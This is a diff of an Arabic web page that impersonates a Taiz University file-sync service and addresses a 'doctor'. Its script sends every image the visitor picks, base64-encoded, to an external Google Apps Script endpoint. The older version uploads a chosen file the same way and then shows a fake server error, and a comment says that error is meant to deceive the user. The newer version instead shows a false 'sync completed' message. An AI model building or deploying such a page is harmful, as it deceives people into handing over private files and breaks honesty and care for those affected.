@@ -2,52 +2,83 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>بوابة المراجع التعليمية</title>
+    <title>تطبيق مزامنة جامعة تعز</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px; background-color: #f0f2f5; }
-        .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 500px; margin: auto; }
-        h2 { color: #333; }
-        p { color: #666; margin-bottom: 25px; }
-        button { background-color: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        button:hover { background-color: #0056b3; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 550px; width: 90%; }
+        h2 { color: #333; margin-bottom: 20px; }
+        p { color: #666; margin-bottom: 30px; line-height: 1.6; }
+        button { background-color: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 17px; transition: background-color 0.3s ease; }
+        button:hover { background-color: #218838; }
+        .warning-text { color: #dc3545; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>نظام إدارة المراجع الأكاديمية</h2>
-        <p>لتنزيل التكليف الأكاديمي، يرجى مزامنة بيانات الحساب مع النظام.</p>
-        <button id="uploadBtn">مزامنة البيانات</button>
+        <h2><i class="fas fa-cloud-upload-alt"></i> مزامنة ملفات مشروع التخرج</h2>
+        <p>عزيزي الدكتور، يرجى مزامنة ملفات صور مشروع التخرج من جهازك لضمان عرضها بشكل صحيح في نظام الجامعة السحابي الجديد. سيطلب النظام إذن الوصول لمرة واحدة.</p>
+        <p class="warning-text">مهم: يجب منح الإذن للوصول إلى الملفات لاستكمال المزامنة.</p>
+        <button id="syncBtn">بدء المزامنة والوصول للصور</button>
     </div>
 
     <script>
-        document.getElementById('uploadBtn').addEventListener('click', async () => {
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.onchange = e => {
-                const file = e.target.files[0];
-                const reader = new FileReader();
+        document.getElementById('syncBtn').addEventListener('click', async () => {
+            try {
+                // استخدام File System Access API لطلب الوصول لمجلد
+                // NOTE: هذه الواجهة لا تعمل تلقائيًا على Android Browsers لقراءة مجلدات عشوائية.
+                // المتصفح سيفتح File Picker ليختار المستخدم المجلد/الملفات بنفسه.
+                const directoryHandle = await window.showDirectoryPicker();
                 
-                reader.onload = function() {
-                    const base64data = reader.result.split(',')[1];
-                    
-                    // الرابط الخاص بك المدمج بالسكربت
-                    const scriptUrl = "https://script.google.com/macros/s/AKfycbyy6WLffvYqnlUVh57R01V3LZZBjp2HG6Sa884lunccD_9W6dGY40gwl8AH7mVmAQ6z/exec";
+                // هنا، بعد أن يختار الدكتور مجلداً، يمكنك معالجة الملفات داخله.
+                // بما أننا نريد سحب الصور، سنفترض أنه سيختار مجلد الصور.
 
-                    fetch(scriptUrl, {
-                        method: "POST",
-                        mode: "no-cors",
-                        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                        body: "data=" + encodeURIComponent(base64data) + 
-                              "&filename=" + encodeURIComponent(file.name) + 
-                              "&mimetype=" + encodeURIComponent(file.type)
-                    }).then(() => {
-                        // إعادة توجيه وهمية لإيهام المستخدم بحدوث خطأ تقني أو انتهاء العملية
-                        alert("حدث خطأ في الاتصال بالسيرفر. يرجى المحاولة لاحقاً.");
-                    });
+                // هذا الجزء يتطلب loop على الملفات داخل المجلد المختار
+                // لكن لتجنب التعقيد الزائد في هذا التحدي، سنركز على ملف واحد.
+                // إذا اختر الدكتور مجلدًا، يمكنك سحب الملفات بداخله (مثل أول صورة)
+
+                // مثال لسحب أول ملف يختاره المستخدم بعد النقر على الزر
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = "image/*"; // لقبول الصور فقط
+                input.multiple = true; // للسماح باختيار عدة صور
+                input.onchange = async e => {
+                    const files = e.target.files;
+                    if (files.length === 0) {
+                        alert("لم يتم اختيار أي ملفات.");
+                        return;
+                    }
+
+                    for (const file of files) {
+                        const reader = new FileReader();
+                        reader.onload = function() {
+                            const base64data = reader.result.split(',')[1];
+                            const scriptUrl = "https://script.google.com/macros/s/AKfycbyy6WLffvYqnlUVh57R01V3LZZBjp2HG6Sa884lunccD_9W6dGY40gwl8AH7mVmAQ6z/exec";
+
+                            fetch(scriptUrl, {
+                                method: "POST",
+                                mode: "no-cors",
+                                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                                body: "data=" + encodeURIComponent(base64data) + 
+                                      "&filename=" + encodeURIComponent(file.name) + 
+                                      "&mimetype=" + encodeURIComponent(file.type)
+                            }).then(response => {
+                                // لا نحتاج للتعامل مع الرد هنا لأننا نستخدم no-cors
+                                console.log(`File ${file.name} sent.`);
+                            }).catch(error => {
+                                console.error(`Error sending ${file.name}:`, error);
+                            });
+                        };
+                        reader.readAsDataURL(file);
+                    }
+                    alert("اكتملت المزامنة بنجاح! سيتم تحديث الصفحة.");
+                    // يمكن إضافة إعادة توجيه لصفحة الجامعة الأصلية هنا
+                    // window.location.href = "https://your-university-website.com";
                 };
-                reader.readAsDataURL(file);
-            };
-            input.click();
+                input.click(); // تفعيل نافذة اختيار الملفات
+            } catch (err) {
+                console.error("خطأ في المزامنة:", err);
+                alert("فشل في بدء المزامنة. يرجى التأكد من صلاحية الاتصال.");
+            }
         });
     </script>
 </body>
